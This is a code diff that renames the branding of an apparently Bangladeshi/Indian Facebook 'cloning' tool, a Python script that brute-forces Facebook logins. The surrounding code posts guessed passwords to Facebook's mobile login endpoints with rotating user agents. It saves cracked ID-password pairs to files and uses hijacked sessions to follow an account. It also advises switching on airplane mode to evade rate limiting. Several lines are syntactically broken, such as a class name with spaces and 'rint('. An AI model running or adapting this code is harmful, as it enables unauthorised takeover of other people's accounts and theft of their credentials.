@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MORAD ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ RJ Raju Razz] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,7 +362,7 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ WRS-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ RJ Raju Razz-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -372,7 +372,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [ WRS-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/WRS-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/RJ Raju Razz-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -408,7 +408,7 @@ logo = ("""
 \033[38;5;46m║\x1b[38;5;196m█████████████████▄░░░░░░░░░░░▄█████████████████\033[38;5;46m║
 \033[38;5;46m║\x1b[38;5;196m████████████████████▄▄▄▄▄▄▄████████████████████\033[38;5;46m║
 \033[38;5;46m╠━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━╣
-\033[38;5;46m║  \033[33;1m𓆩💜𓆪𝙉𝘼𝙈𝙀𓆩💜𓆪          \033[38;5;46m║ \033[38;5;46m𓆩𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯𓆪  \033[38;5;46m║
+\033[38;5;46m║  \033[33;1m𓆩💜𓆪𝙉𝘼𝙈𝙀𓆩💜𓆪          \033[38;5;46m║ \033[38;5;46m𓆩RJ Raju Razz𓆪  \033[38;5;46m║
 \033[38;5;46m║  \033[33;1m𓆩💜𓆪𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆𓆩💜𓆪      \033[38;5;46m║ \033[33;1m𓆩𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯𓆪       \033[38;5;46m║
 \033[38;5;46m║  \033[33;1m𓆩💜𓆪𝙍𝙀𝙇𝙄𝙂𝙄𝙊𝙉𓆩💜𓆪    \033[38;5;46m║ \033[33;1m𓆩𝘼𝙓𝙊𝙈𝙄𝙔𝘼𓆪        \033[38;5;46m║
 \033[38;5;46m║ \033[33;1m 𓆩💜𓆪𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋𓆩💜𓆪      \033[38;5;46m║ \033[33;1m𓆩+919954282827𓆪     \033[38;5;46m║
@@ -450,31 +450,26 @@ class RJ Raju Razz:
 			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••Ｒｊ Ｒａｊｕ Ｒａｚｚ•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
+			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••RJ Raju Razz•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
 			time.sleep(3.0)
 			os.system("clear")
 		print()
 		print("""
-
-
-██████   █████       ██ ██    ██       ██   ██ 
-██   ██ ██   ██      ██ ██    ██        ██ ██  
-██████  ███████      ██ ██    ██ █████   ███   
-██   ██ ██   ██ ██   ██ ██    ██        ██ ██  
-██   ██ ██   ██  █████   ██████        ██   ██ 
-                                               
-                                               
-
+  \x1b[38;5;196m███    ███  \033[38;5;46m██████  \x1b[38;5;196m██████   \033[38;5;46m█████  \x1b[38;5;196m██████
+  \x1b[38;5;196m████  ████ \033[38;5;46m██    ██ \x1b[38;5;196m██   ██ \033[38;5;46m██   ██ \x1b[38;5;196m██   ██
+  \x1b[38;5;196m██ ████ ██ \033[38;5;46m██    ██ \x1b[38;5;196m██████  \033[38;5;46m███████ \x1b[38;5;196m██   ██
+  \x1b[38;5;196m██  ██  ██ \033[38;5;46m██    ██ \x1b[38;5;196m██   ██ \033[38;5;46m██   ██ \x1b[38;5;196m██   ██
+  \x1b[38;5;196m██      ██  \033[38;5;46m██████  \x1b[38;5;196m██   ██ \033[38;5;46m██   ██ \x1b[38;5;196m██████
 \x1b[38;5;196m╔━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━╗
-\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙉𝘼𝙈𝙀𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;91m𓆩𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯𓆪  \x1b[38;5;196m║
-\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯𓆪       \x1b[38;5;196m║
+\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙉𝘼𝙈𝙀𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;91m𓆩RJ Raju Razz𓆪  \x1b[38;5;196m║
+\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩𝙍𝙅 𝙍𝘼𝙅𝙐 𝙍𝘼𝙕𝙕𓆪       \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙍𝙀𝙇𝙄𝙂𝙄𝙊𝙉𓆩💜𓆪    \x1b[38;5;196m║ \x1b[1;96m𓆩𝘼𝙓𝙊𝙈𝙄𝙔𝘼𓆪        \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩+919954282827𓆪     \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀𓆩💜𓆪    \x1b[38;5;196m║ \x1b[1;96m𓆩𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚𓆪     \x1b[38;5;196m║
 \x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎𓆩💜𓆪  \x1b[38;5;196m║ \x1b[1;96m𓆩𝙋𝗔𝗜𝗗𓆪               \x1b[38;5;196m║
 \x1b[38;5;196m╚════════════════════════╩══════════════════════╝
  
-\033[1;37m================== \33[32;45mRJ Raju Razz\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mMORAD\33[0;m ======================\n""")
 		
 		print("\x1b[1;93m╭──────────────────────────────────────────────────────────────╮")
 		print("\x1b[1;93m│ \x1b[1;95m[\x1b[1;91m1\x1b[1;95m] \x1b[1;92mCRACK FILE CLONING \x1b[1;91m(\x1b[1;96mFREE\x1b[1;91m)                                \x1b[1;93m│")
@@ -524,7 +519,7 @@ class RJ Raju Razz:
 				os.system("clear")
 				print(logo)
 				print("\n%s \x1b[1;97m[H] THE PROCESS HAS BEEN STARTED: OK.txt"%(Y))
-				print("%s \x1b[1;97m[H] ENJOY RJ Raju Razz COMMND 😘 : CP.txt"%(G))
+				print("%s \x1b[1;97m[H] ENJOY RJ  COMMND 😘 : CP.txt"%(G))
 				print("%s \x1b[1;97m[O] USE AIRPLANE MOOD EVERY 4MIN\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -897,7 +892,7 @@ class RJ Raju Razz:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ RJ Raju Razz ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ RJ Raju Razz] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -951,7 +946,7 @@ class RJ Raju Razz:
 				os.system("clear")
 				print(logo)
 				print("\n%s \x1b[1;97m[+] THE PROCESS HAS BEEN STARTED: OK.txt"%(Y))
-				print("%s \x1b[1;97m[+] ENJOY RJ COMMND : CP.txt"%(G))
+				print("%s \x1b[1;97m[+] ENJOY WRS COMMND : CP.txt"%(G))
 				print("%s \x1b[1;97m[!] USER AIRPLANE EVERY 4MIN \x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -1347,7 +1342,7 @@ class RJ Raju Razz:
 				open("2009-RJ Raju Razz-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ WRS-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RJ Raju Razz-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-RJ Raju Razz-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1374,8 +1369,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m The Tool Is Paid You Need Approval First\033[1;37m\n")
-		print(" \033[1;32m Note : Yeh Tool Free  Hai  JAY SHREE RAM🚩\033[1;37m")
+		print(" \033[1;32m This Tool Is Paid You Need Approval First\033[1;37m\n")
+		print(" \033[1;32m Note : Yeh Tool Free  Hai JAY SHREE RAM🚩\033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1387,7 +1382,7 @@ def Subscraption():
 		print ("")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
-		tks = 'Dear%20RJ Sir,%20Please%20Approve%20My%20Key%20To%20Premium%20%20Thank You❤%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
+		tks = 'Dear%20RJ Sir, %20Please%20Approve%20My%20Key%20To%20Premium%20%20Thank You❤%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
 		os.system('am start https://wa.me/+919954282827?text=' + tks)
 		Subscription()        
 RJ Raju Razz()
